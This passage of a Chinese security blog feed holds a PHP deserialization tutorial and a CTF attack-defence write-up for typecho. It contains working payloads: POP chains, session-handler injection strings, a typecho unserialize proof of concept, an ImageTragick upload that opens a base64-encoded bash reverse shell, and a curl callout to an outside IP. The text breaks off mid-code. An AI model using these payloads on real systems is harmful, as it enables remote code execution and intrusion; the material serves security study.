id="魔法方法实战（二）"><a href="#魔法方法实战（二）" class="headerlink" title="魔法方法实战（二）"></a>魔法方法实战（二）</h3><p>刚才的案例或许比较简单，我们在这样的基础上提高难度。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">       <span class="keyword">return</span> <span class="string">'1'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;c-&gt;no();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">'sky'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们观察到整个代码里有3个类，每个类里各一个属性，一个魔法方法。而最危险的函数为class A，其中有一步：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;a);</span><br></pre></td></tr></table></figure></p><p>如果想控制a的值是非常容易的，但是如何触发该方法是个问题，通过之前的案例，我们知道__toString()在对象被当做字符串输出的时候会自动触发，但程序的输入点中并没有echo等操作，所以直接对A进行序列化攻击是无效的。<br>那么我们寻找是否有将对象当做字符串输出的点：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>发现class B中有echo操作，会输出$b的值，我们也知道$b的值很容易控制，但是如何触发<strong>call()方法呢？<br>查阅官方手册，我们发现：在对象中调用一个不可访问方法时，</strong>call() 会被调用。<br>所以下一步我们要继续寻找，是否有对象调用了不可访问方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;c-&gt;no();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>我们再class C中发现<strong>destruct()魔法方法，其中调用了不可访问方法no()，我们看一下如何触发：析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。<br>所以整个利用链呼之欲出了：<br>1.使用Class C中的</strong>destruct()触发不可访问方法调用<br>2.通过不可访问方法调用触发Class B中<strong>call方法<br>3.通过</strong>call方法中的echo，使其输出对象，触发ClassA中__toString方法<br>4.通过Class A中的$a进行RCE<br>所以我们可以完整构造如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sky1 = <span class="keyword">new</span> A();</span><br><span class="line">$sky1-&gt;a = <span class="string">"system('ls /tmp');"</span>;</span><br><span class="line">$sky2 = <span class="keyword">new</span> B();</span><br><span class="line">$sky2-&gt;b = $sky1;</span><br><span class="line">$sky3 = <span class="keyword">new</span> C();</span><br><span class="line">$sky3-&gt;c = $sky2;</span><br><span class="line">var_dump(serialize($sky3));</span><br></pre></td></tr></table></figure></p><p>即可完成利用，进行RCE。</p><h2 id="session序列化引擎漏洞"><a href="#session序列化引擎漏洞" class="headerlink" title="session序列化引擎漏洞"></a>session序列化引擎漏洞</h2><h3 id="session序列化引擎样例"><a href="#session序列化引擎样例" class="headerlink" title="session序列化引擎样例"></a>session序列化引擎样例</h3><p>众所周知，session会将数据以序列化的格式存储在服务端，我们写如下测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'login_ok'</span>] = <span class="keyword">true</span>;</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'sky'</span>;</span><br><span class="line">$_SESSION[<span class="string">'age'</span>] = <span class="number">9999</span>;</span><br></pre></td></tr></table></figure></p><p>我们从默认路径找到session数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sessions/sess_027m6oo5ok4e22qaevsag7r7m0</span><br></pre></td></tr></table></figure></p><p>内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_ok|b:1;name|s:3:&quot;sky&quot;;age|i:9999;</span><br></pre></td></tr></table></figure></p><p>那么这是什么存储格式呢？查阅相关手册，可以得知session序列化具有以下3种不同的引擎：<br>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值。<br>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值。<br>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值。<br>而在没有指定引擎的时候，会默认使用php引擎。<br>如果我们指定引擎:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'login_ok'</span>] = <span class="keyword">true</span>;</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'sky'</span>;</span><br><span class="line">$_SESSION[<span class="string">'age'</span>] = <span class="number">9999</span>;</span><br></pre></td></tr></table></figure></p><p>此时session文件内容变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:8:&quot;login_ok&quot;;b:1;s:4:&quot;name&quot;;s:3:&quot;sky&quot;;s:3:&quot;age&quot;;i:9999;&#125;</span><br></pre></td></tr></table></figure></p><p>那么如果程序在存储session时用的引擎与解码session时用的引擎不同，是否会触发问题呢？答案是显然的。</p><h3 id="session序列化引擎漏洞实战（一）"><a href="#session序列化引擎漏洞实战（一）" class="headerlink" title="session序列化引擎漏洞实战（一）"></a>session序列化引擎漏洞实战（一）</h3><p>还是以Jarvis OJ的一道题做样例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32784/</span><br></pre></td></tr></table></figure></p><p>源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>在本题中我们看到，从头到尾并未有传入序列化和反序列化的点。但是翻阅phpinfo()：<br><img src="/images/2019-05-05-11-09-08.png" alt=""><br>熟悉的同学应该都知道，一旦session.upload_progress.enabled开启，我们是可以控制session文件内容的，可参考这篇文章：<a href="https://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress。">https://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress。</a><br>这样一来，我们即可控制session文件内容，在触发session读取的时候，会进行反序列化。根据代码不难发现，2个魔法方法都是我们之前提及的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可控制$mdzz进行任意RCE，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:22:&quot;var_dump(scandir(&apos;.&apos;))&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>但是紧接着问题又来了，我们的input为php_serialize，但题目的引擎为php，那么如何让他进行成功反序列化呢?<br>这里就要和php的格式有关了，我们根据之前的内容知道：php存储方式是，键名+竖线+经过serialize()函数序列处理的值。<br>那么竖线之前为键名，竖线之后为经过serialize()函数序列处理的值，所以我们只要构造如下poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:22:&quot;var_dump(scandir(&apos;.&apos;))&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>即可成功利用php的解析规则，让我们的恶意序列化payload被当做key然后经过反序列化被成功触发。<br>那么为什么程序会反序列化呢？下图给了我们很好的解释：<br><img src="/images/2019-05-05-14-54-50.jpg" alt=""></p><h3 id="session序列化引擎漏洞实战（二）"><a href="#session序列化引擎漏洞实战（二）" class="headerlink" title="session序列化引擎漏洞实战（二）"></a>session序列化引擎漏洞实战（二）</h3><p>又如2018 LCTF这样一道题：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION),<span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b,$a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>题目要求我们用上述代码，进行SSRF，仿造127.0.0.1请求flag.php即可拿到flag。同时作者禁用了一些危险函数。详细的题解我已经写在这篇文章了：<a href="https://skysec.top/2018/11/17/2018-Xctf%20Final&amp;LCTF-Bestphp/#bestphp%E2%80%99s-revenge。此处我们只做一些思路上的剖析。">https://skysec.top/2018/11/17/2018-Xctf%20Final&amp;LCTF-Bestphp/#bestphp%E2%80%99s-revenge。此处我们只做一些思路上的剖析。</a><br>首先我们观察到两个命令执行函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">call_user_func($b,$a);</span><br></pre></td></tr></table></figure></p><p>第一行想进行RCE还是非常容易的，我们直接传递两个参数即可。但第二行看起来并不可控。实际上我们可以用变量覆盖的思想，使用第一行覆盖$b，也能有一些用处，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?f=extract</span><br><span class="line"></span><br><span class="line">b=call_user_func</span><br></pre></td></tr></table></figure></p><p>那么这道题如何进行SSRF呢？实际上这和php的内置类有关：SoapClient。<br><img src="/images/2019-05-05-14-44-56.png" alt=""><br>这个类非常有趣，他有一个魔法方法为：<strong>call，我们可以利用该方法触发我们想做的操作。这里就不再展开SoapClient的通信功能了。有兴趣可以去看上述链接。<br>我们知道魔法方法</strong>call的触发方式是对象调用不可访问方法，那么本题里怎么让SoapClient调用不可访问方法呢？之前我说过b参数可以覆盖为call_user_func，这样答案就呼之欲出了：<br><img src="/images/2019-05-05-14-51-22.jpg" alt=""><br>如图即可成功触发SoapClient调用不可访问方法：welcome_to_the_lctf2018，触发后对象将会发起通讯请求，模拟127.0.0.1访问flag.php。<br>那么如何先把对象存入程序呢？这里即用到之前所说的session序列化引擎的问题。我们可以先让序列化引擎为php_serialize，在取出数据时，不指定引擎，则默认使用php引擎去反序列化，从而达成不被引擎的解析结构所干扰的目的。<br>那么如何设置session序列化引擎呢？这里我们利用如下这行命令即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func($_GET[f],$_POST);</span><br></pre></td></tr></table></figure></p><p>然后发起如下请求，即可达到目的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?f=session_start</span><br><span class="line"></span><br><span class="line">serialize_handler=php</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>由于篇幅有限，本篇文章只能暂且两则知识点：1.利用魔法方法攻击，2.利用session序列化引擎攻击。后续有时间会继续带来更深入的奇技淫巧，敬请期待~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;近期因为内部培训有序列化的需求，于是趁此机会由浅入深的剖析一下序列化相关内容。&lt;br&gt;之前也写过由浅入深的xml漏洞系列，欢迎阅读：&lt;br&gt;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019西湖论剑AD攻防Web题解</title>
    <link href="http://skysec.top/2019/04/25/2019%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91AD%E6%94%BB%E9%98%B2Web%E9%A2%98%E8%A7%A3/"/>
    <id>http://skysec.top/2019/04/25/2019西湖论剑AD攻防Web题解/</id>
    <published>2019-04-25T01:50:38.000Z</published>
    <updated>2019-05-01T05:44:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上周参加了西湖论剑线下赛，在AD攻防赛中喜迎冠军，以下是AD攻防赛中2道web的题解。</p><h2 id="Web1-typecho"><a href="#Web1-typecho" class="headerlink" title="Web1 - typecho"></a>Web1 - typecho</h2><p>整体源码如下<br><img src="/images/2019-04-25-12-32-36.png" alt=""><br>因为是typecho CMS，所以肯定有已知CVE，由于之前审计过，这就不重新分析了，只分析人为加入的。</p><h3 id="漏洞1-反序列化CVE"><a href="#漏洞1-反序列化CVE" class="headerlink" title="漏洞1 - 反序列化CVE"></a>漏洞1 - 反序列化CVE</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2017/12/29/cms%E5%B0%8F%E7%99%BD%E5%AE%A1%E8%AE%A1-typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/</span><br></pre></td></tr></table></figure><p>可参加我以前分析的这篇文章，构造如下序列化，进行RCE<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type=<span class="string">'ATOM 1.0'</span>;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'0'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'author'</span>=&gt; <span class="keyword">new</span> Typecho_Request())</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="string">'phpinfo()'</span>);</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'assert'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$poc = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'adapter'</span>=&gt;<span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line"><span class="string">'prefix'</span>=&gt;<span class="string">'typecho'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($poc));</span><br></pre></td></tr></table></figure></p><h3 id="漏洞2-Imagick"><a href="#漏洞2-Imagick" class="headerlink" title="漏洞2 - Imagick"></a>漏洞2 - Imagick</h3><p>通过源码diff，可以发现<br>/var/Widget/Users/Profile.php<br>有明显不同，插入了一大段代码<br><img src="/images/2019-04-25-13-30-33.png" alt=""><br>我们审计这段代码，可以发现关键点<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $image = <span class="keyword">new</span> Imagick($file[<span class="string">'tmp_name'</span>]);</span><br><span class="line">    $image-&gt;scaleImage(<span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">    file_put_contents($path, $image-&gt;getImageBlob());</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;widget(<span class="string">'Widget_Notice'</span>)-&gt;set(_t(<span class="string">"头像上传失败"</span>), <span class="string">'error'</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;response-&gt;goBack();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这段代码使用了Imagick()，而该函数存在RCE漏洞<br>我们以如下代码为例进行测试<br><img src="/images/2019-04-25-13-44-23.png" alt=""><br>构造上传内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_upload&quot;; filename=&quot;exp.gif&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pICZndDsmIC9kZXYvdGNwL2lwL3BvcnQgMCZndDsmMQ== | base64 -d | bash`&quot;| cat flag &quot; )&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure></p><p>即可RCE</p><h3 id="漏洞3-authcode泄露"><a href="#漏洞3-authcode泄露" class="headerlink" title="漏洞3 - authcode泄露"></a>漏洞3 - authcode泄露</h3><p>我们diff可以发现如下路径，存在新增文件：<br>/var/Sitemap.php<br><img src="/images/2019-04-25-13-36-41.png" alt=""><br>我们审计代码发现关键点<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ab</span><span class="params">($a=<span class="string">'a'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $b = authcode(base64_decode(<span class="string">'MjJkZnFseEVScHcxWkU5c08raGxoOUJzWGFKM0F3NWVPMm5QUUFISm5WSDhuTGc='</span>));</span><br><span class="line">    $b($a);</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">    ob_start(ab);</span><br><span class="line">    <span class="keyword">echo</span> authcode($_GET[<span class="string">'site'</span>]);</span><br><span class="line">    ob_end_flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们直接var_dump($b)，发现为system，即此处如果可控$a，则可进行RCE<br>我们测试一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ab</span><span class="params">($a=<span class="string">'a'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// replace all the apples with oranges</span></span><br><span class="line"><span class="keyword">return</span> system($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_start(<span class="string">"ab"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">curl <span class="number">106.14</span><span class="number">.114</span><span class="number">.127</span>:<span class="number">24444</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ob_end_flush();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>可收到请求<br><img src="/images/2019-04-25-14-04-28.png" alt=""><br>则不难发现，如果我们能控制如下函数的输出内容，即可进行任意RCE<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">authcode($_GET[&apos;site&apos;]);</span><br></pre></td></tr></table></figure></p><p>那我们跟进authcode<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authcode</span><span class="params">($string, $key = <span class="string">'12333010101'</span>)</span> </span>&#123;</span><br><span class="line">    $ckey_length = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    $key = md5($key ? $key : $GLOBALS[<span class="string">'discuz_auth_key'</span>]);</span><br><span class="line"></span><br><span class="line">    $keya = md5(substr($key, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">    $keyb = md5(substr($key, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">    $keyc = substr($string, <span class="number">0</span>, $ckey_length);</span><br><span class="line"></span><br><span class="line">    $cryptkey = $keya . md5($keya . $keyc);</span><br><span class="line">    $key_length = strlen($cryptkey);</span><br><span class="line"></span><br><span class="line">    $string =  base64_decode(substr($string, $ckey_length));</span><br><span class="line">    $string_length = strlen($string);</span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    $box = range(<span class="number">0</span>, <span 